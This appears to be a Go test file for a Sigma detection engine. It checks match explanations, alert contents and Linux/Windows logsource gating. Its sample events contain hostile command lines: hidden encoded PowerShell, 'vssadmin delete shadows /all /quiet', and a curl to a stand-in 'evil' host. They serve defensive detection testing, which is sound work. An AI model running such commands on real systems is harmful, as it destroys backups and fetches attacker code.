package sigma

import (
	"context"
	"strings"
	"testing"
)

func TestExplainMatch_NamesTheFieldThatFired(t *testing.T) {
	rule := &Rule{
		ID: "r1", Title: "Encoded PowerShell",
		Logsource: map[string]string{"product": "windows", "category": "process_creation"},
		Condition: "selection_img and selection_enc",
		Detection: map[string]interface{}{
			"selection_img": map[string]interface{}{
				"Image|endswith": []interface{}{`\powershell.exe`, `\pwsh.exe`},
			},
			"selection_enc": map[string]interface{}{
				"CommandLine|contains": " -enc ",
			},
		},
	}
	event := map[string]interface{}{
		"EventID":            "4688",
		"NewProcessName":     `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		"ProcessCommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgA",
	}

	if !MatchEvent(rule, event) {
		t.Fatal("precondition: the rule should match this event")
	}
	matches := ExplainMatch(rule, event)
	if len(matches) != 2 {
		t.Fatalf("expected one explanation per selection field, got %d: %+v", len(matches), matches)
	}

	byField := map[string]FieldMatch{}
	for _, m := range matches {
		byField[m.Field] = m
	}

	img, ok := byField["Image"]
	if !ok {
		t.Fatal("expected an explanation for Image")
	}
	// The list has two alternatives; the explanation must name the one that
	// actually matched, not the whole alternation.
	if img.Expected != `\powershell.exe` {
		t.Errorf("expected the matching alternative, got %q", img.Expected)
	}
	if !strings.Contains(img.Actual, "powershell.exe") {
		t.Errorf("actual value not reported: %q", img.Actual)
	}
	if img.Modifier != "endswith" {
		t.Errorf("modifier not reported: %q", img.Modifier)
	}

	cmd, ok := byField["CommandLine"]
	if !ok {
		t.Fatal("expected an explanation for CommandLine")
	}
	if !strings.Contains(cmd.Actual, "-enc") {
		t.Errorf("actual command line not reported: %q", cmd.Actual)
	}
}

func TestExplainMatch_ValuesAreBounded(t *testing.T) {
	long := strings.Repeat("A", 5000)
	rule := &Rule{
		Condition: "selection",
		Detection: map[string]interface{}{
			"selection": map[string]interface{}{"CommandLine|contains": "AAA"},
		},
	}
	matches := ExplainMatch(rule, map[string]interface{}{"CommandLine": long})
	if len(matches) != 1 {
		t.Fatalf("expected one match, got %d", len(matches))
	}
	if len(matches[0].Actual) > maxExplainValue+3 {
		t.Errorf("actual value not truncated: %d chars", len(matches[0].Actual))
	}
}

// An alert must carry the explanation so the UI never has to re-derive it.
func TestScanEvents_AlertCarriesExplanation(t *testing.T) {
	e := buildTestEngine([]*Rule{{
		ID: "r1", Title: "Shadow copy deletion", Level: "critical",
		Logsource: map[string]string{"product": "windows", "category": "process_creation"},
		Condition: "selection",
		Detection: map[string]interface{}{
			"selection": map[string]interface{}{"CommandLine|contains|all": []interface{}{"shadow", "delete"}},
		},
	}})
	alerts, err := e.ScanEvents(context.Background(), []map[string]interface{}{{
		"EventID":            "4688",
		"ProcessCommandLine": "vssadmin.exe delete shadows /all /quiet",
	}})
	if err != nil {
		t.Fatal(err)
	}
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert, got %d", len(alerts))
	}
	if alerts[0].Condition != "selection" {
		t.Errorf("alert should carry the rule condition, got %q", alerts[0].Condition)
	}
	if len(alerts[0].Matches) == 0 {
		t.Fatal("alert should carry the field comparisons that fired")
	}
	if !strings.Contains(alerts[0].Matches[0].Actual, "vssadmin") {
		t.Errorf("explanation should quote the observed value, got %q", alerts[0].Matches[0].Actual)
	}
}

// --- Linux gating ---------------------------------------------------------

func linuxProcRule() *Rule {
	return &Rule{
		ID: "lin1", Title: "Linux recon",
		Logsource: map[string]string{"product": "linux", "category": "process_creation"},
		Condition: "selection",
		Detection: map[string]interface{}{
			"selection": map[string]interface{}{"CommandLine|contains": "whoami"},
		},
	}
}

func TestLogsource_LinuxRuleMatchesLinuxEventOnly(t *testing.T) {
	rule := linuxProcRule()

	linuxEvent := map[string]interface{}{
		"Platform": "linux", "Source": "auditd", "EventID": "process_creation",
		"Executable": "/usr/bin/whoami", "CommandLine": "whoami -a",
	}
	if !logsourceMatches(rule, linuxEvent) {
		t.Error("a linux rule must apply to a linux event")
	}

	winEvent := map[string]interface{}{"EventID": "4688", "ProcessCommandLine": "whoami"}
	if logsourceMatches(rule, winEvent) {
		t.Error("a linux rule must not apply to a windows event")
	}

	// And the reverse: a windows rule must not be judged against linux telemetry.
	winRule := &Rule{
		Logsource: map[string]string{"product": "windows", "category": "process_creation"},
		Condition: "selection",
		Detection: map[string]interface{}{"selection": map[string]interface{}{"CommandLine|contains": "whoami"}},
	}
	if logsourceMatches(winRule, linuxEvent) {
		t.Error("a windows rule must not apply to a linux event")
	}
}

func TestLogsource_LinuxCategoryGating(t *testing.T) {
	rule := linuxProcRule()
	authEvent := map[string]interface{}{
		"Platform": "linux", "Source": "auditd", "EventID": "user_auth", "CommandLine": "whoami",
	}
	if logsourceMatches(rule, authEvent) {
		t.Error("a process_creation rule must not fire on a user_auth event")
	}
}

// The index and logsourceMatches must agree, or a linux rule gets filed under a
// Windows event number and is never even considered.
func TestIndex_LinuxRuleIsReachable(t *testing.T) {
	e := buildTestEngine([]*Rule{linuxProcRule()})
	if got := len(e.byEventID["process_creation"]); got != 1 {
		t.Fatalf("linux rule should be bucketed under its category name, got %d", got)
	}
	alerts, err := e.ScanEvents(context.Background(), []map[string]interface{}{{
		"Platform": "linux", "Source": "auditd", "EventID": "process_creation",
		"Executable": "/usr/bin/whoami", "CommandLine": "sudo whoami",
	}})
	if err != nil {
		t.Fatal(err)
	}
	if len(alerts) != 1 {
		t.Fatalf("expected the linux rule to fire through the index, got %d alerts", len(alerts))
	}
}

// Upstream linux rules are written against Sysmon-style names; the auditd
// collector emits its own. The alias table has to bridge them.
func TestLookupField_LinuxAliases(t *testing.T) {
	ev := map[string]interface{}{
		"Platform": "linux", "Source": "auditd", "EventID": "process_creation",
		"Executable": "/usr/bin/curl", "ParentExe": "/bin/bash", "CommandLine": "curl http://evil/x",
	}
	sel := map[string]interface{}{
		"Image|endswith": "/curl",
		"ParentImage":    "/bin/bash",
	}
	if !matchSelection(sel, ev) {
		t.Error("Image/ParentImage should resolve onto the auditd field names")
	}
}
